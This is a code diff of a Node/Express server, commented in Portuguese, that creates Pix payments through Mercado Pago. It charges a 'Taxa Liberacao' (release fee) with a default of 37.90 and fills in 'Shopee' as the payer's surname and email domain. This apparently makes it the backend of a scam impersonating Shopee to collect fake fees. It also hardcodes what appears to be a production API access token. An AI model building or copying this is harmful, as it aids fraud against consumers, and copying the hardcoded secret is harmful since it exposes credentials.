@@ -5,46 +5,34 @@ import path from 'path';
 
 const app = express();
 
-// 1. Configurações para evitar bloqueios
+// 1. DESATIVAR CACHE (ISSO RESOLVE O SEU PROBLEMA)
+app.disable('etag');
+app.use((req, res, next) => {
+    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+    next();
+});
+
 app.use(express.json());
 app.use(cors({ origin: '*' }));
 
-// 2. ROTA DE STATUS (Para o Railway saber que está vivo)
-app.get('/health', (req, res) => {
-    res.status(200).send('Railway Online 🚀');
-});
-
-// ========================================================
-// 3. ROTA PIX (MERCADO PAGO) - TOKEN ATUALIZADO
-// ========================================================
+// 2. ROTA API PIX (MERCADO PAGO)
 app.post('/pix', async (req, res) => {
-    console.log("🔔 [RAILWAY] Processando Pix...");
-    
+    console.log("🔔 [PIX] Pedido Recebido!");
     try {
         const { amount, name, cpf, email } = req.body;
-
-        // SEU TOKEN DE PRODUÇÃO (O ÚLTIMO QUE VOCÊ MANDOU)
+        
+        // Token de Produção
         const ACCESS_TOKEN = 'APP_USR-7433336192149093-020423-97cd4e2614f56c0f43836231bfb0e432-202295570';
-
-        // Tratamento de dados para evitar recusa do MP
-        const cpfLimpo = String(cpf).replace(/\D/g, '');
-        const partesNome = String(name).trim().split(' ');
-        const primeiroNome = partesNome[0] || "Cliente";
-        const sobrenome = partesNome.length > 1 ? partesNome.slice(1).join(' ') : "Shopee";
-        const emailPagador = (email && email.includes('@')) ? email : "pagamento@shopee.com";
 
         const payload = {
             transaction_amount: Number(amount) || 37.90,
-            description: "Taxa de Liberacao",
+            description: "Taxa Liberacao",
             payment_method_id: "pix",
             payer: {
-                email: emailPagador,
-                first_name: primeiroNome,
-                last_name: sobrenome,
-                identification: {
-                    type: "CPF",
-                    number: cpfLimpo
-                }
+                email: (email && email.includes('@')) ? email : "pagamento@shopee.com",
+                first_name: String(name).split(' ')[0] || "Cliente",
+                last_name: "Shopee",
+                identification: { type: "CPF", number: String(cpf).replace(/\D/g, '') }
             }
         };
 
@@ -52,32 +40,22 @@ app.post('/pix', async (req, res) => {
             headers: {
                 'Authorization': `Bearer ${ACCESS_TOKEN}`,
                 'Content-Type': 'application/json',
-                'X-Idempotency-Key': `railway-${Date.now()}`
+                'X-Idempotency-Key': `pix-${Date.now()}`
             }
         });
 
-        console.log("✅ Pix Criado! ID:", response.data.id);
+        console.log("✅ PIX CRIADO: ID", response.data.id);
         res.status(201).json(response.data);
 
     } catch (error: any) {
-        console.error("❌ Erro MP:", error.response?.data || error.message);
-        // Retorna o erro exato para o frontend
-        res.status(500).json({ error: "Erro no Pagamento", detalhes: error.response?.data });
+        console.error("❌ ERRO MP:", error.response?.data || error.message);
+        res.status(500).json({ error: "Erro Pix", detalhes: error.response?.data });
     }
 });
 
-// ========================================================
-// 4. SERVIR O SITE (FRONTEND)
-// ========================================================
-// O Railway roda o server dentro da pasta /dist, então o html está uma pasta acima (../)
+// 3. SERVIR SITE
 app.use(express.static(path.join(__dirname, '../')));
+app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
 
-app.get('*', (req, res) => {
-    res.sendFile(path.join(__dirname, '../index.html'));
-});
-
-// 5. Inicialização (Railway usa process.env.PORT automaticamente)
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🚀 Server rodando na porta ${PORT}`);
-});
+app.listen(PORT, () => console.log(`🚀 SERVIDOR NOVO NO AR - PORTA ${PORT}`));
